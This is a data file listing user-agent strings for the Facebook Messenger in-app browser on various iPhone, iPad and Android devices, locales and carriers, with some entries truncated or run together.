Mozilla/5.0 (iPhone; CPU iPhone OS 11_4_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15G77 [FBAN/MessengerForiOS;FBDV/iPhone8,1;FBMD/iPhone;FBSN/iOS;FBSV/11.4.1;FBSS/2;FBID/phone;FBLC/hu_HU;FBOP/5]
Mozilla/5.0 (iPad; CPU OS 13_2_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 [FBAN/MessengerForiOS;FBDV/iPad5,1;FBMD/iPad;FBSN/iOS;FBSV/13.2.3;FBSS/2;FBID/tablet;FBLC/en_US;FBOP/5]
Mozilla/5.0 (iPhone; CPU iPhone OS 13_3_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 [FBAN/MessengerForiOS;FBDV/iPhone9,4;FBMD/iPhone;FBSN/iOS;FBSV/13.3.1;FBSS/3;FBID/phone;FBLC/en_US;FBOP/5]
Mozilla/5.0 (iPhone; CPU iPhone OS 13_3_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 [FBAN/MessengerForiOS;FBDV/iPhone10,4;FBMD/iPhone;FBSN/iOS;FBSV/13.3.1;FBSS/2;FBID/phone;FBLC/en_GB;FBOP/5]
Mozilla/5.0 (iPhone; CPU iPhone OS 11_4_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15G77 [FBAN/MessengerForiOS;FBDV/iPhone8,2;FBMD/iPhone;FBSN/iOS;FBSV/11.4.1;FBSS/3;FBID/phone;FBLC/en_GB;FBOP/5]
Mozilla/5.0 (iPad; CPU OS 10_3_3 like Mac OS X) AppleWebKit/603.3.8 (KHTML, like Gecko) Mobile/14G60 [FBAN/MessengerForiOS;FBDV/iPad3,4;FBMD/iPad;FBSN/iOS;FBSV/10.3.3;FBSS/2;FBID/tablet;FBLC/en_US;FBOP/5]
Mozilla/5.0 (iPad; CPU OS 12_4_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 [FBAN/MessengerForiOS;FBDV/iPad4,1;FBMD/iPad;FBSN/iOS;FBSV/12.4.5;FBSS/2;FBID/tablet;FBLC/en_US;FBOP/5]
Mozilla/5.0 (iPhone; CPU iPhone OS 13_3_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 [FBAN/MessengerForiOS;FBDV/iPhone10,6;FBMD/iPhone;FBSN/iOS;FBSV/13.3.1;FBSS/3;FBID/phone;FBLC/en_GB;FBOP/5]
Mozilla/5.0 (iPhone; CPU iPhone OS 13_3_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 [FBAN/MessengerForiOS;FBDV/iPhone10,4;FBMD/iPhone;FBSN/iOS;FBSV/13.3.1;FBSS/2;FBID/phone;FBLC/hu_HU;FBOP/5]
Mozilla/5.0 (iPhone; CPU iPhone OS 12_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 [FBAN/MessengerForiOS;FBDV/iPhone7,2;FBMD/iPhone;FBSN/iOS;FBSV/12.2;FBSS/2;FBID/phone;FBLC/zh_TW;FBOP/5]
Mozilla/5.0 (iPad; CPU OS 13_3_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 [FBAN/MessengerForiOS;FBDV/iPad11,3;FBMD/iPad;FBSN/iOS;FBSV/13.3.1;FBSS/2;FBID/tablet;FBLC/en_US;FBOP/5]
Mozilla/5.0 (iPad; CPU OS 10_3_3 like Mac OS X) AppleWebKit/603.3.8 (KHTML, like Gecko) Mobile/14G60 [FBAN/MessengerForiOS;FBDV/iPad6,12;FBMD/iPad;FBSN/iOS;FBSV/10.3.3;FBSS/2;FBID/tablet;FBLC/en_US;FBOP/5]
Mozilla/5.0 (iPhone; CPU iPhone OS 13_1_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 [FBAN/MessengerForiOS;FBDV/iPhone10,2;FBMD/iPhone;FBSN/iOS;FBSV/13.1.3;FBSS/3;FBID/phone;FBLC/vi_VN;FBOP/5]
Mozilla/5.0 (iPhone; CPU iPhone OS 13_3_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 [FBAN/MessengerForiOS;FBDV/iPhone11,8;FBMD/iPhone;FBSN/iOS;FBSV/13.3.1;FBSS/2;FBID/phone;FBLC/cs_CZ;FBOP/5]
Mozilla/5.0 (iPhone; CPU iPhone OS 12_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/16A366 [FBAN/MessengerForiOS;FBDV/iPhone8,4;FBMD/iPhone;FBSN/iOS;FBSV/12.0;FBSS/2;FBID/phone;FBLC/en_US;FBOP/5]
Mozilla/5.0 (iPhone; CPU iPhone OS 13_3_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 [FBAN/MessengerForiOS;FBDV/iPhone9,4;FBMD/iPhone;FBSN/iOS;FBSV/13.3.1;FBSS/3;FBID/phone;FBLC/ru_RU;FBOP/5]
Mozilla/5.0 (iPhone; CPU iPhone OS 13_3_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 [FBAN/MessengerForiOS;FBDV/iPhone11,6;FBMD/iPhone;FBSN/iOS;FBSV/13.3.1;FBSS/3;FBID/phone;FBLC/es_LA;FBOP/5]
Mozilla/5.0 (iPad; CPU OS 13_3_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 [FBAN/MessengerForiOS;FBDV/iPad5,1;FBMD/iPad;FBSN/iOS;FBSV/13.3.1;FBSS/2;FBID/tablet;FBLC/ru_RU;FBOP/5]
Mozilla/5.0 (iPhone; CPU iPhone OS 12_4_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 [FBAN/MessengerForiOS;FBDV/iPhone7,2;FBMD/iPhone;FBSN/iOS;FBSV/12.4.1;FBSS/2;FBID/phone;FBLC/nb_NO;FBOP/5]
Mozilla/5.0 (iPhone; CPU iPhone OS 12_3_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 [FBAN/MessengerForiOS;FBDV/iPhone9,3;FBMD/iPhone;FBSN/iOS;FBSV/12.3.1;FBSS/2;FBID/phone;FBLC/pl_PL;FBOP/5]
Mozilla/5.0 (iPad; CPU OS 13_1_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 [FBAN/MessengerForiOS;FBAV/243.0.0.43.118;FBBV/185083733;FBDV/iPad5,3;FBMD/iPad;FBSN/iOS;FBSV/13.1.3;FBSS/2;FBID/tablet;FBLC/es_ES;FBOP/5]
Mozilla/5.0 (iPhone; CPU iPhone OS 11_3 like Mac OS X) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/59.0.3071.125 Mobile Safari/537.36 [FBAN/MessengerForiOS;FBAV/209.0.0.33.90;FBBV/142900020;FBDV/iPhone7,2;FBMD/iPhone;FBSN/iOS;FBSV/12.1.4;FBSS/2;FBCR/Vodafone.de;FBID/phone;FBLC/es_LA;FBOP/5;FBRV/143552906]
Mozilla/5.0 (iPad; CPU iPad OS 10_3_2 like Mac OS X) AppleWebKit/603.2.4 (KHTML, like Gecko) Mobile/14F89 [FBAN/MessengerForiOS;FBAV/142.0.0.38.63;FBBV/77803202;FBDV/iPad8,4;FBMD/iPad;FBSN/iOS;FBSV/10.3.2;FBSS/2;FBCR/NOS;FBID/phone;FBLC/jv_ID;FBOP/5;FBRV/77803202]
Mozilla/5.0 (iPad; CPU OS 12_3_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 [FBAN/MessengerForiOS;FBAV/122.0.0.40.69;FBBV/61279955;FBDV/iPad4,1;FBMD/iPad;FBSN/iOS;FBSV/10.1.1;FBSS/2;FBCR/;FBID/tablet;FBLC/pt_PT;FBOP/5;FBRV/0]
Mozilla/5.0 (iPhone; CPU iPhone OS 11_2_1 like Mac OS X) AppleWebKit/604.4.7 (KHTML, like Gecko) Mobile/15C153 [FBAN/MessengerForiOS;FBAV/147.0.0.50.87;FBBV/84235609;FBDV/iPhone8,1;FBMD/iPhone;FBSN/iOS;FBSV/11.2.1;FBSS/2;FBCR/vodafoneP;FBID/phone;FBLC/pt_PT;FBOP/5;FBRV/0] Mozilla/5.0 (iPhone; CPU iPhone OS 11_4_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15G77 [FBAN/MessengerForiOS;FBAV/177.0.0.38.75;FBBV/119094790;FBDV/iPhone9,3;FBMD/iPhone;FBSN/iOS;FBSV/11.4.1;FBSS/2;FBCR/MEO;FBID/phone;FBLC/pt_PT;FBOP/5;FBRV/0] Mozilla/5.0 (iPhone; CPU iPhone OS 11_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E302 [FBAN/MessengerForiOS;FBAV/167.0.0.57.96;FBBV/109575372;FBDV/iPhone7,2;FBMD/iPhone;FBSN/iOS;FBSV/11.3.1;FBSS/2;FBCR/Movicel;FBID/phone;FBLC/pt_PT;FBOP/5;FBRV/0] Mozilla/5.0 (Linux; Android 4.4.2; HUAWEI Y625-U21 Build/HUAWEIY625-U21) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/30.0.0.0 Mobile Safari/537.36 [FB_IAB/MESSENGER;FBAV/136.0.0.8.90;] Mozilla/5.0 (iPhone; CPU iPhone OS 11_2_6 like Mac OS X) AppleWebKit/604.5.6 (KHTML, like Gecko) Mobile/15D100 [FBAN/MessengerForiOS;FBAV/154.0.0.37.96;FBBV/93159637;FBDV/iPhone8,4;FBMD/iPhone;FBSN/iOS;FBSV/11.2.6;FBSS/2;FBCR/UNITEL;FBID/phone;FBLC/pt_PT;FBOP/5;FBRV/0] Mozilla/5.0 (iPhone; CPU iPhone OS 11_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E302 [FBAN/MessengerForiOS;FBAV/167.0.0.57.96;FBBV/109575372;FBDV/iPhone7,1;FBMD/iPhone;FBSN/iOS;FBSV/11.3.1;FBSS/3;FBCR/MEO;FBID/phone;FBLC/pt_PT;FBOP/5;FBRV/0] Mozilla/5.0 (iPhone; CPU iPhone OS 10_3_3 like Mac OS X) AppleWebKit/603.3.8 (KHTML, like Gecko) Mobile/14G60 [FBAN/MessengerForiOS;FBAV/160.0.0.49.95;FBBV/101168249;FBDV/iPhone5,2;FBMD/iPhone;FBSN/iOS;FBSV/10.3.3;FBSS/2;FBCR/NOS;FBID/phone;FBLC/pt_PT;FBOP/5;FBRV/0] Mozilla/5.0 (iPhone; CPU iPhone OS 11_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E216 [FBAN/MessengerForiOS;FBAV/161.0.0.53.95;FBBV/102491769;FBDV/iPhone7,2;FBMD/iPhone;FBSN/iOS;FBSV/11.3;FBSS/2;FBCR/NOS;FBID/phone;FBLC/en_GB;FBOP/5;FBRV/0] Mozilla/5.0 (iPhone; CPU iPhone OS 11_2_6 like Mac OS X) AppleWebKit/604.5.6 (KHTML, like Gecko) Mobile/15D100 [FBAN/MessengerForiOS;FBAV/160.0.0.49.95;FBBV/101168249;FBDV/iPhone6,2;FBMD/iPhone;FBSN/iOS;FBSV/11.2.6;FBSS/2;FBCR/vodafoneP;FBID/phone;FBLC/pt_PT;FBOP/5;FBRV/0] Mozilla/5.0 (iPhone; CPU iPhone OS 11_0_2 like Mac OS X) AppleWebKit/604.1.38 (KHTML, like Gecko) Mobile/15A421 [FBAN/MessengerForiOS;FBAV/152.0.0.37.98;FBBV/90712625;FBDV/iPhone7,2;FBMD/iPhone;FBSN/iOS;FBSV/11.0.2;FBSS/2;FBCR/vodafoneP;FBID/phone;FBLC/pt_PT;FBOP/5;FBRV/0] Mozilla/5.0 (iPhone; CPU iPhone OS 11_2_1 like Mac OS X) AppleWebKit/604.4.7 (KHTML, like Gecko) Mobile/15C153 [FBAN/MessengerForiOS;FBAV/148.0.0.31.386;FBBV/86952252;FBDV/iPhone9,3;FBMD/iPhone;FBSN/iOS;FBSV/11.2.1;FBSS/2;FBCR/MEO;FBID/phone;FBLC/pt_PT;FBOP/5;FBRV/0] Mozilla/5.0 (iPhone; CPU iPhone OS 11_4_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15G77 [FBAN/MessengerForiOS;FBAV/176.0.0.37.78;FBBV/118347320;FBDV/iPhone10,4;FBMD/iPhone;FBSN/iOS;FBSV/11.4.1;FBSS/2;FBCR/NOS;FBID/phone;FBLC/pt_PT;FBOP/5;FBRV/0] Mozilla/5.0 (iPhone; CPU iPhone OS 11_2_1 like Mac OS X) AppleWebKit/604.4.7 (KHTML, like Gecko) Mobile/15C153 [FBAN/MessengerForiOS;FBAV/149.0.0.34.93;FBBV/87964402;FBDV/iPhone8,1;FBMD/iPhone;FBSN/iOS;FBSV/11.2.1;FBSS/2;FBCR/vodafoneP;FBID/phone;FBLC/pt_PT;FBOP/5;FBRV/0] Mozilla/5.0 (Linux; U; Android 4.2.2; pt-pt; RX3DC-3 Build/JDQ39) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Safari/534.30 [FB_IAB/MESSENGER;FBAV/137.0.0.15.90;]
Mozilla/5.0 (iPhone; CPU iPhone OS 11_2_5 like Mac OS X) AppleWebKit/604.5.6 (KHTML, like Gecko) Mobile/15D60 [FBAN/MessengerForiOS;FBAV/151.0.0.45.96;FBBV/90061748;FBDV/iPhone9,3;FBMD/iPhone;FBSN/iOS;FBSV/11.2.5;FBSS/2;FBCR/MEO;FBID/phone;FBLC/en_GB;FBOP/5;FBRV/0]
Mozilla/5.0 (iPad; CPU OS 10_1_1 like Mac OS X) AppleWebKit/602.2.14 (KHTML, like Gecko) Mobile/14B100 [FBAN/MessengerForiOS;FBAV/122.0.0.40.69;FBBV/61279955;FBDV/iPad4,1;FBMD/iPad;FBSN/iOS;FBSV/10.1.1;FBSS/2;FBCR/;FBID/tablet;FBLC/en_US;FBOP/5;FBRV/0]
Mozilla/5.0 (Linux; Android 7.1.2; Nexus 5X Build/N2G47F; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/57.0.2987.132 Mobile Safari/537.36 [FB_IAB/MESSENGER;FBAV/114.0.0.21.71;]
Mozilla/5.0 (Linux; Android 5.0.2; SF1 Build/LRX22G; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/59.0.3071.125 Mobile Safari/537.36 [FB_IAB/MESSENGER;FBAV/129.0.0.17.91;]
Mozilla/5.0 (Linux; Android 10; SM-G973F Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/83.0.4103.106 Mobile Safari/537.36 [FB_IAB/MESSENGER;FBAV/359.0.0.30.118;;]
Mozilla/5.0 (iPhone; CPU iPhone OS 9_3_5 like Mac OS X) AppleWebKit/601.1.46 (KHTML, like Gecko) Mobile/13G36 [FBAN/MessengerForiOS;FBAV/90.0.0.24.70;FBBV/39954546;FBRV/0;FBDV/Machintosh,2;FBMD/iPhone;FBSN/iPhone OS;FBSV/9.3.5;FBSS/2;FBCR/VinaPhone;FBID/phone;FBLC/vi_VN;FBOP/5]
Mozilla/5.0 (iPhone; CPU iPhone OS 9_3_5 like Mac OS X) AppleWebKit/601.1.46 (KHTML, like Gecko) Mobile/13G36 [FBAN/MessengerForiOS;FBAV/90.0.0.24.70;FBBV/39954546;FBRV/0;FBDV/iPhone7,2;FBMD/iPhone;FBSN/iPhone OS;FBSV/9.3.5;FBSS/2;FBCR/VinaPhone;FBID/phone;FBLC/vi_VN;FBOP/5]
Mozilla/5.0 (iPhone; CPU iPhone OS 12_2_2 like Mac OS X) AppleWebKit/604.4.7 (KHTML, like Gecko) Mobile/15C202 [FBAN/MessengerForiOS;FBAV/147.0.0.50.87;FBBV/84235609;FBDV/iPhone9,4;FBMD/iPhone;FBSN/iOS;FBSV/11.2.2;FBSS/3;FBCR/NOS;FBID/phone;FBLC/ja_JP;FBOP/5;FBRV/0]
Mozilla/5.0 (Linux; Android 6.0.1; SM-G900W8 Build/MMB29M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/54.0.2840.85 Mobile Safari/537.36 [FB_IAB/MESSENGER;FBAV/100.0.0.29.61;]
Mozilla/5.0 (Linux; U; Android 4.3; en-us; C6530N Build/JLS36C) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30 [FB_IAB/MESSENGER;FBAV/110.0.0.14.69;]
Mozilla/5.0 (iPhone; CPU iPhone OS 13_3_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 [FBAN/MessengerForiOS;FBDV/iPhone12,3;FBMD/iPhone;FBSN/iOS;FBSV/13.3.1;FBSS/3;FBID/phone;FBLC/vi_VN;FBOP/5]
Mozilla/5.0 (iPhone; CPU iPhone OS 13_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 [FBAN/MessengerForiOS;FBDV/iPhone10,1;FBMD/iPhone;FBSN/iOS;FBSV/13.5;FBSS/2;FBID/phone;FBLC/de_DE;FBOP/5]
Mozilla/5.0 (iPad; CPU OS 11_2_2 like Mac OS X) AppleWebKit/604.4.7 (KHTML, like Gecko) Mobile/15C202 [FBAN/MessengerForiOS;FBAV/148.0.0.31.386;FBBV/86952252;FBDV/iPad6,11;FBMD/iPad;FBSN/iOS;FBSV/11.2.2;FBSS/2;FBCR/;FBID/tablet;FBLC/ja_JP;FBOP/5;FBRV/0]
Mozilla/5.0 (iPad; CPU OS 8_1 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Mobile/12B410 [FBAN/MessengerForiOS;FBAV/153.0.0.47.97;FBBV/91923955;FBDV/iPad4,2;FBMD/iPad;FBSN/iPhone OS;FBSV/8.1;FBSS/2;FBCR/MegaFon;FBID/tablet;FBLC/id_ID;FBOP/5;FBRV/0]
Mozilla/5.0 (iPhone; CPU iPhone OS 11_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E216 [FBAN/MessengerForiOS;FBAV/161.0.0.53.95;FBBV/102491769;FBDV/iPhone9,3;FBMD/iPhone;FBSN/iOS;FBSV/11.3;FBSS/2;FBCR/o2-de;FBID/phone;FBLC/id_ID;FBOP/5;FBRV/0]
Mozilla/5.0 (iPhone; CPU iPhone OS 11_2_2 like Mac OS X) AppleWebKit/604.4.7 (KHTML, like Gecko) Mobile/15C202 [FBAN/MessengerForiOS;FBAV/147.0.0.50.87;FBBV/84235609;FBDV/iPhone9,4;FBMD/iPhone;FBSN/iOS;FBSV/11.2.2;FBSS/3;FBCR/NOS;FBID/phone;FBLC/ja_JP;FBOP/5;FBRV/0]
Mozilla/5.0 (Linux; Android 7.0; Infinix HOT 4 Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.152 Mobile Safari/537.36 [FB_IAB/MESSENGER;FBAV/114.0.0.21.71;]
Mozilla/5.0 (Linux; Android 7.1.2; Nexus 5X Build/N2G47F; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/57.0.2987.132 Mobile Safari/537.36 [FB_IAB/MESSENGER;FBAV/114.0.0.21.71;] Mozilla/5.0 (Linux; U; Android 4.3; en-us; C6530N Build/JLS36C) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30 [FB_IAB/MESSENGER;FBAV/110.0.0.14.69;]
Mozilla/5.0 (Linux; Android 10; SM-G973F Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/83.0.4103.106 Mobile Safari/537.36 [FB_IAB/MESSENGER;FBAV/221.1.0.15.157;] [ip:157.240.217.35]
Mozilla/5.0 (iPhone; CPU iPhone OS 12_0_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/16A404 [FBAN/MessengerForiOS;FBDV/iPhone7,2;FBMD/iPhone;FBSN/iOS;FBSV/12.0.1;FBSS/2;FBID/phone;FBLC/en_GB;FBOP/5]
Mozilla/5.0 (iPhone; CPU iPhone OS 10_2_1 like Mac OS X) AppleWebKit/602.4.6 (KHTML, like Gecko) Mobile/14D27 [FBAN/MessengerForiOS;FBAV/167.0.0.57.96;FBBV/109575372;FBDV/iPhone9,3;FBMD/iPhone;FBSN/iOS;FBSV/10.2.1;FBSS/2;FBCR/MegaFon;FBID/phone;FBLC/ru_RU
Mozilla/5.0 (iPhone; CPU iPhone OS 11_4_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15G77 [FBAN/MessengerForiOS;FBDV/iPhone8,1;FBMD/iPhone;FBSN/iOS;FBSV/11.4.1;FBSS/2;FBCR/Tele2;FBID/phone;FBLC/en_GB;FBOP/5;FBRV/0]
Mozilla/5.0 (iPhone; CPU iPhone OS 13_2_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 [FBAN/MessengerForiOS;FBDV/iPhone10,6;FBMD/iPhone;FBSN/iOS;FBSV/13.2.3;FBSS/3;FBID/phone;FBLC/ru_RU;FBOP/5]
Mozilla/5.0 (iPhone; CPU iPhone OS 12_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 [FBAN/MessengerForiOS;FBDV/iPhone8,1;FBMD/iPhone;FBSN/iOS;FBSV/12.4;FBSS/2;FBCR/Mobile TeleSystems;FBID/phone;FBLC/ru_RU;FBOP/5]
Mozilla/5.0 (iPhone; CPU iPhone OS 12_3_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 [FBAN/MessengerForiOS;FBDV/iPhone10,5;FBMD/iPhone;FBSN/iOS;FBSV/12.3.2;FBSS/3;FBCR/Beeline;FBID/phone;FBLC/ru_RU;FBOP/5]
Mozilla/5.0 (iPhone; CPU iPhone OS 11_4_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15G77 [FBAN/MessengerForiOS;FBDV/iPhone9,3;FBMD/iPhone;FBSN/iOS;FBSV/11.4.1;FBSS/2;FBCR/Beeline;FBID/phone;FBLC/ru_RU;FBOP/5]
Mozilla/5.0 (iPhone; CPU iPhone OS 11_2_6 like Mac OS X) AppleWebKit/604.5.6 (KHTML, like Gecko) Mobile/15D100 [FBAN/MessengerForiOS;FBDV/iPhone9,1;FBMD/iPhone;FBSN/iOS;FBSV/11.2.6;FBSS/2;FBCR/Mobile TeleSystems;FBID/phone;FBLC/ru_RU;FBOP/5]
Mozilla/5.0 (iPhone; CPU iPhone OS 7_1_2 like Mac OS X) AppleWebKit/537.51.2 (KHTML, like Gecko) Mobile/11D257 [FBAN/MessengerForiOS;FBAV/11.0.0.15.14;FBBV/4026123;FBDV/iPhone5,2;FBMD/iPhone;FBSN/iPhone OS;FBSV/7.1.2;FBSS/2; FBCR/MegaFon;FBID/phone;FBLC/r
Mozilla/5.0 (Linux; Android 5.0; Lenovo A1000 Build/S100; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/43.0.2357.121 Mobile Safari/537.36 [FB_IAB/MESSENGER;FBAV/110.0.0.14.69;]
Mozilla/5.0 (iPhone; CPU iPhone OS 11_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15F79 [FBAN/MessengerForiOS;FBAV/172.0.0.51.84;FBBV/115215338;FBDV/iPhone10,6;FBMD/iPhone;FBSN/iOS;FBSV/11.4;FBSS/3;FBCR/Beeline;FBID/phone;FBLC/ru_RU;F
Mozilla/5.0 (iPhone; CPU iPhone OS 13_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 [FBAN/MessengerForiOS;FBDV/iPhone11,8;FBMD/iPhone;FBSN/iOS;FBSV/13.3;FBSS/2;FBID/phone;FBLC/ru_RU;FBOP/5]
Mozilla/5.0 (iPhone; CPU iPhone OS 12_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 [FBAN/MessengerForiOS;FBDV/iPhone10,3;FBMD/iPhone;FBSN/iOS;FBSV/12.2;FBSS/3;FBCR/Tele2;FBID/phone;FBLC/ru_RU;FBOP/5]
Mozilla/5.0 (iPhone; CPU iPhone OS 11_2_2 like Mac OS X) AppleWebKit/604.4.7 (KHTML, like Gecko) Mobile/15C202 [FBAN/MessengerForiOS;FBAV/161.0.0.53.95;FBBV/102491769;FBDV/iPhone8,4;FBMD/iPhone;FBSN/iOS;FBSV/11.2.2;FBSS/2;FBCR/YOTA;FBID/phone;FBLC/ru_RU;F
Mozilla/5.0 (iPhone; CPU iPhone OS 12_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 [FBAN/MessengerForiOS;FBDV/iPhone9,4;FBMD/iPhone;FBSN/iOS;FBSV/12.2;FBSS/3;FBCR/Mobile TeleSystems;FBID/phone;FBLC/ru_RU;FBOP/5]
Mozilla/5.0 (iPhone; CPU iPhone OS 11_4_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15G77 [FBAN/MessengerForiOS;FBDV/iPhone10,4;FBMD/iPhone;FBSN/iOS;FBSV/11.4.1;FBSS/2;FBCR/MobileTeleSystems;FBID/phone;FBLC/ru_RU;FBOP/5;FBRV/0]
Mozilla/5.0 (iPad; CPU OS 12_0_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/16A404 [FBAN/MessengerForiOS;FBAV/193.0.0.49.98;FBBV/132029873;FBDV/iPad5,4;FBMD/iPad;FBSN/iOS;FBSV/12.0.1;FBSS/2;FBCR/Beeline;FBID/tablet;FBLC/ru_RU;FBOP/5]
Mozilla/5.0 (Linux; U; Android 4.3; vi-vn; ASUS_T00J Build/JSS15Q) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30 [FB_IAB/MESSENGER;FBAV/138.0.0.20.92;]
Mozilla/5.0 (iPhone; CPU iPhone OS 13_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 [FBAN/MessengerForiOS;FBDV/iPhone10,5;FBMD/iPhone;FBSN/iOS;FBSV/13.3;FBSS/3;FBID/phone;FBLC/ru_RU;FBOP/5]
Mozilla/5.0 (iPhone; CPU iPhone OS 12_1_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/16D57 [FBAN/MessengerForiOS;FBDV/iPhone7,2;FBMD/iPhone;FBSN/iOS;FBSV/12.1.4;FBSS/2;FBID/phone;FBLC/ru_RU;FBOP/5]
Mozilla/5.0 (Linux; Android 6.0.1; SM-G532F Build/MMB29T; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/59.0.3071.125 Mobile Safari/537.36 [FB_IAB/MESSENGER;FBAV/129.0.0.17.91;]
Mozilla/5.0 (iPhone; CPU iPhone OS 8_1_3 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Mobile/12B466 [FBAN/MessengerForiOS;FBAV/19.1.0.12.23;FBBV/6318336;FBDV/iPhone5,2;FBMD/iPhone;FBSN/iPhone OS;FBSV/8.1.3;FBSS/2; FBCR/MobileTeleSystems;FBID/pho
Mozilla/5.0 (iPhone; CPU iPhone OS 9_1 like Mac OS X) AppleWebKit/601.1.46 (KHTML, like Gecko) Mobile/13B143 [FBAN/MessengerForiOS;FBAV/58.0.0.32.81;FBBV/22628760;FBDV/iPhone8,1;FBMD/iPhone;FBSN/iPhone OS;FBSV/9.1;FBSS/2; FBCR/Carrier;FBID/phone;FBLC/ru_R
Mozilla/5.0 (iPhone; CPU iPhone OS 9_1 like Mac OS X) AppleWebKit/601.1.46 (KHTML, like Gecko) Mobile/13B143 [FBAN/MessengerForiOS;FBAV/47.0.0.19.116;FBBV/17056928;FBDV/iPhone7,2;FBMD/iPhone;FBSN/iPhone OS;FBSV/9.1;FBSS/2; FBCR/Carrier;FBID/phone;FBLC/de_
Mozilla/5.0 (iPhone; CPU iPhone OS 9_2_1 like Mac OS X) AppleWebKit/601.1.46 (KHTML, like Gecko) Mobile/13D15 [FBAN/MessengerForiOS;FBAV/55.0.0.28.59;FBBV/20754519;FBDV/iPhone5,1;FBMD/iPhone;FBSN/iPhone OS;FBSV/9.2.1;FBSS/2; FBCR/Carrier;FBID/phone;FBLC/r
Mozilla/5.0 (iPhone; CPU iPhone OS 7_0_4 like Mac OS X) AppleWebKit/537.51.1 (KHTML, like Gecko) Mobile/11B554a [FBAN/MessengerForiOS;FBAV/3.1.2;FBBV/1027309;FBDV/iPhone5,2;FBMD/iPhone;FBSN/iPhone OS;FBSV/7.0.4;FBSS/2; FBCR/MobileTeleSystems;FBID/phone;FB
Mozilla/5.0 (iPhone; CPU iPhone OS 7_0_3 like Mac OS X) AppleWebKit/537.51.1 (KHTML, like Gecko) Mobile/11B511 [FBAN/MessengerForiOS;FBAV/9.1.0.15.14;FBBV/3594432;FBDV/iPhone3,1;FBMD/iPhone;FBSN/iPhone OS;FBSV/7.0.3;FBSS/2; FBCR/MegaFon;FBID/phone;FBLC/ru
